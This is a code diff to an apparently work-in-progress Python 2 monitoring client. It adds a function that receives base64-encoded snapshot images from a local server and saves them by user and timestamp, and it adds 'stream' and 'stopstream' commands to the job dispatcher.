@@ -21,6 +21,58 @@ def log(msg):
 		print msg
 	return
 
+def get_stream(userid):
+	# Connect to the stream request handler on the server
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("127.0.0.1", 8004))
+
+	# Send the requested userid to the server
+	s.send(userid)
+
+	while True:
+		log('Waiting for data')
+		data = s.recv(300000)
+		log('Got data')
+		if not data:
+			log('breaking')
+			break
+
+		#print data[0:50]
+		arr_data = data.split(',')
+
+		#msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, encoded_data)
+		userid = arr_data[0]
+		image_date = arr_data[1]
+		image_hour = arr_data[2]
+		image_minute = arr_data[3]
+		snapid = arr_data[4]
+		encoded_len = int(arr_data[5])
+
+		folder_path = os.path.join(IMAGE_SAVE_PATH, userid, image_date, image_hour, image_minute)
+		try:
+			os.makedirs(folder_path)
+		except OSError:
+			# Folder exists
+			pass
+
+		log('From userid: {0}, and snapid: {1}'.format(userid, snapid))
+		log('Expecting {0} bytes of data'.format(encoded_len))
+		got_encoded = ""
+		while len(got_encoded) != encoded_len:
+			data = s.recv(300000)
+			log('Got encoded data, len={0}, max={1}'.format(len(data), encoded_len))
+			if not data:
+				log('breaking encoded')
+				break
+			got_encoded += data
+			log("now we have {0} from {1}".format(len(got_encoded), encoded_len))
+
+		fname = "{0}.jpg".format(snapid)
+		log("writing file {0}".format(fname))
+		f = open(os.path.join(folder_path, fname), 'ab')
+		f.write(base64.b64decode(got_encoded))
+		f.close()
+	f.close()
 
 def lockscreen_handler():
 	# TODO think of a way to lock the user until other command
@@ -104,10 +156,17 @@ def main():
 		if req == 'snap':
 			killSnap = 0
 			threading.Thread(target=snap_handler, args=(userid,)).start()
-		if req == 'lockscreen':
+		elif req == 'lockscreen':
 			lockscreen_handler()
-		if req == 'stopsnap':
+		elif req == 'stopsnap':
 			killSnap = 1
+		elif req.startswith('stream'):
+			stream_userid = req.split(';')[1]
+			threading.Thread(target=get_stream, args=(userid,)).start()
+			# TODO Start the view.exe process with stream_userid
+		elif req == 'stopstream':
+			# TODO Stop the streaming
+			pass
 		elif req == 'nojobs':
 			log('no jobs for me!')
 
